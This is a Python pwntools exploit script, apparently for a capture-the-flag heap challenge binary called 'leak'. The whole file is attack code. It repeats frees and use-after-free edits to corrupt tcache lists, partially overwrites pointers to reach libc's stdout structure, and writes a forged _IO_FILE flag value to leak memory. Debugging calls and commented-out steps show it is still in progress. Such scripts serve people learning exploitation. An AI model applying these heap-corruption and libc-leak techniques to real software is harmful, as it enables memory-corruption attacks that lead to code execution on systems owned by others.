from pwn import * 
from LibcSearcher import * 
# context.log_level = 'debug' 
p=process('./leak')
elf=ELF('./leak')
def add(index,size):
    p.recvuntil(b'6. exit\n')
    p.recvuntil(b'Your choice: ')
    p.sendline(b'1')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Size: ')
    p.sendline(str(size).encode())
def edit(index,content):
    p.recvuntil(b'6. exit\n')
    p.recvuntil(b'Your choice: ')
    p.sendline(b'2')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
    p.recvuntil(b'Content: ')
    p.send(content)
def free(index):
    p.recvuntil(b'6. exit\n')
    p.recvuntil(b'Your choice: ')
    p.sendline(b'3')
    p.recvuntil(b'Index: ')
    p.sendline(str(index).encode())
p.recvuntil(b'set up.\n')
add(0,0xb0)
add(1,0xb0)

add(2,0x20)
add(3,0x20)
add(4,0x20)
for i in range(3):
    free(2)
    edit(2,p64(0)*2)
    free(3)
    edit(3,p64(0)*2)
free(2)
free(3)
# edit(2,p64(0)*2)
# gdb.attach(p)

for i in range(3):
    free(0)
    edit(0,p64(0)*2)
    free(1)
    edit(1,p64(0)*2)
free(0)
free(1)
add(5,0x30)
add(6,0x60)
edit(1,b'\x50\xc7')
add(7,0xb0)
add(8,0xb0)
add(9,0xb0)
# edit()
# add(15,0xb0)


for i in range(3):
    free(0)
    edit(0,p64(0)*2)
    free(1)
    edit(1,p64(0)*2)
free(0)
free(1)
add(12,0x30)
add(13,0x60)
edit(0,b'\x80\xc7')
add(10,0xb0)
add(11,0xb0)
edit(9,p64(0)*2+p64(0xfbad1800)+p64(0)*2+p64(0x31)+p64(0)+p64(0x5fffffffffff))
# edit(11,p64(0)+p64(0x5fffffffffff))
# free(11)
# add(15,0x20)
# free(5)
# free(15)
# edit(11,b'\x50\xf0')
gdb.attach(p)
# edit(9,p64(0xfbad1800)+p64(0)*4+p64(0x5fffffffffff))
context.log_level = 'debug' 
p.recvuntil(b'6. exit\n')
p.recvuntil(b'Your choice: ')
pause()
p.sendline(b'6')
# recvthine=p.recv(100)
# print(recvthine)
p.interactive()